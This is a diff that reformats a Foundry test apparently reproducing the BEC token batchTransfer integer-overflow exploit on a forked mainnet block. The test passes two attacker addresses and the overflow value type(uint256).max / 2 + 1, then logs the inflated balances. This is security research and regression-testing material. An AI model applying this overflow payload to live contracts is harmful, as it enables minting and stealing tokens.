@@ -6,10 +6,11 @@ import "forge-std/Test.sol";
 import "./../interface.sol";
 
 interface BECToken {
-    function balanceOf(
-        address account
-    ) external view returns (uint256);
-    function batchTransfer(address[] calldata _receivers, uint256 _value) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function batchTransfer(
+        address[] calldata _receivers,
+        uint256 _value
+    ) external returns (bool);
 }
 
 // https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f
@@ -23,21 +24,37 @@ contract ContractTest is Test {
 
     function setUp() public {
         cheats.createSelectFork("mainnet", 5_483_642);
-        string memory bytecodePath=vm.envString("BYTECODE_PATH");
+        string memory bytecodePath = vm.envString("BYTECODE_PATH");
         bytes memory newRuntimeBytecode = vm.readFileBinary(bytecodePath);
-        vm.etch(address(bec),newRuntimeBytecode);
+        vm.etch(address(bec), newRuntimeBytecode);
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("Before Exploit, Attacker1 BEC Balance", bec.balanceOf(attacker1), 18);
-        emit log_named_decimal_uint("Before Exploit, Attacker2 BEC Balance", bec.balanceOf(attacker2), 18);
+        emit log_named_decimal_uint(
+            "Before Exploit, Attacker1 BEC Balance",
+            bec.balanceOf(attacker1),
+            18
+        );
+        emit log_named_decimal_uint(
+            "Before Exploit, Attacker2 BEC Balance",
+            bec.balanceOf(attacker2),
+            18
+        );
 
         address[] memory receivers = new address[](2);
         receivers[0] = attacker1;
         receivers[1] = attacker2;
         bec.batchTransfer(receivers, type(uint256).max / 2 + 1);
 
-        emit log_named_decimal_uint("After Exploit, Attacker1 BEC Balance", bec.balanceOf(attacker1), 18);
-        emit log_named_decimal_uint("After Exploit, Attacker2 BEC Balance", bec.balanceOf(attacker2), 18);
+        emit log_named_decimal_uint(
+            "After Exploit, Attacker1 BEC Balance",
+            bec.balanceOf(attacker1),
+            18
+        );
+        emit log_named_decimal_uint(
+            "After Exploit, Attacker2 BEC Balance",
+            bec.balanceOf(attacker2),
+            18
+        );
     }
 }
